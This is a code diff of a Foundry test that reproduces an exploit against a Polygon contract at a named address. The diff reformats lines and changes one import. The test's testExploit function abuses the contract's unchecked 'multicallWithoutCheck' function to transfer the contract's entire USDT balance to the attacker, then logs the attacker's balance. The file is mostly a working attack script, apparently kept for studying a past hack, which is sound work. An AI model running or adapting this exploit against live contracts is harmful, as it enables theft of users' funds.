@@ -3,11 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 // Address https://polygonscan.com/address/0x940ce652a51ebadb5df09d605dbeda95fdcf697b
 interface Target {
-
     struct Call {
         address target;
         bytes callData;
@@ -15,11 +14,9 @@ interface Target {
     }
 
     function multicallWithoutCheck(Call[] memory calls) external;
-
 }
 
 contract ContractTest is Test {
-
     struct Call {
         address target;
         bytes callData;
@@ -35,13 +32,24 @@ contract ContractTest is Test {
 
     function testExploit() public {
         uint256 USDTBlance = USDT.balanceOf(address(target));
-        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), USDTBlance);
-        Target.Call memory inputData = Target.Call({target: address(USDT), callData: data, value: 0});
+        bytes memory data = abi.encodeWithSignature(
+            "transfer(address,uint256)",
+            address(this),
+            USDTBlance
+        );
+        Target.Call memory inputData = Target.Call({
+            target: address(USDT),
+            callData: data,
+            value: 0
+        });
         Target.Call[] memory calls = new Target.Call[](1);
         calls[0] = inputData;
         target.multicallWithoutCheck(calls);
 
-        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "[End] Attacker USDT balance after exploit",
+            USDT.balanceOf(address(this)),
+            6
+        );
     }
-
 }
